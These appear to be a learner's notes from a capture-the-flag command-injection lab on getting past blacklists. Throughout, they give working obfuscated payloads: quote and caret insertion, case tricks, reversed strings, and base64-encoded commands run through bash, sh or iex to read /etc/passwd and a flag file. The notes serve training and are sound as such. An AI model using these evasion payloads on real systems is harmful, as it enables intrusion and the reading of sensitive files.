some WAFs/apps will blacklist OS commands like `whoami` , lets see how we can bypass them
## linux
```shell-session
$ w'h'o'am'i

$ w"h"o"am"i

who$@ami
w\ho\am\i
```
## Windows

There are also some Windows-only characters we can insert in the middle of commands that do not affect the outcome, like a caret (`^`) character, as we can see in the following example:

Bypassing Blacklisted Commands

```cmd-session
C:\htb> who^ami
```
## Exercise

+ 2 Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found.
![](Pasted%20image%2020250529163603.png)

# advanced  obfuscation

## Case Manipulation WINDOWS
```powershell-session
WhOaMi
```
## LINUX
when it comes to Linux and a bash shell, which are case-sensitive, as mentioned earlier, we have to get a bit creative and find a command that turns the command into an all-lowercase word. One working command we can use is the following:

```shell-session
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d
```
![](Pasted%20image%2020250529164254.png)
## Commands Blacklist

We have so far successfully bypassed the character filter for the space and semi-colon characters in our payload. So, let us go back to our very first payload and re-add the `whoami` command to see if it gets executed

### REVERSING COMMAND
```

┌──(demise㉿kali)-[~]
└─$ echo 'imaohw'|rev                                                                          
whoami

┌──(demise㉿kali)-[~]
└─$ rev<<<'imaohw'
whoami
```
![](Pasted%20image%2020250529164741.png)

# Command obfuscation 

### Case Manipulation

Case Manipulation (windows)
```powershell-session
PS C:\htb> WhOaMi

21y4d
```

case manip. linux (case sensitive)
```shell-session
$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d
```

```bash 
#lowercase all! expansion parameter (${a,,})
$(a="WhOaMi";printf %s "${a,,}")
```
## reverse commands

```shell-session
echo 'whoami' | rev
```

```shell-session
$(rev<<<'imaohw')
demise
```
reverse the  commands (windows)
```powershell-session
PC1> ('imaohw'[-1..-20] -join '')"

21y4d
```
### Encode COMMANDS

windows encode
```powershell-session
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```
windows decode
```powershell-session
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```
We may also achieve the same thing on Linux, but we would have to convert the string from `utf-8` to `utf-16` before we `base64` it, as follows:

```shell-session
$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

```shell-session
 echo -n 'cat /etc/passwd | grep 33' | base64
 Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

```
└─$ echo -n 'cat /flag.txt' | base64
Y2F0IC9mbGFnLnR4dA==
```

try replacing bash or sh with something that's not filtered if filtered
(openssl, zsh, bash...etc `xxd` for hex decoding.)
```shell-session
bash<<<$(base64 -d<<<Y2F0IC9mbGFnLnR4dA==)

sh<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

	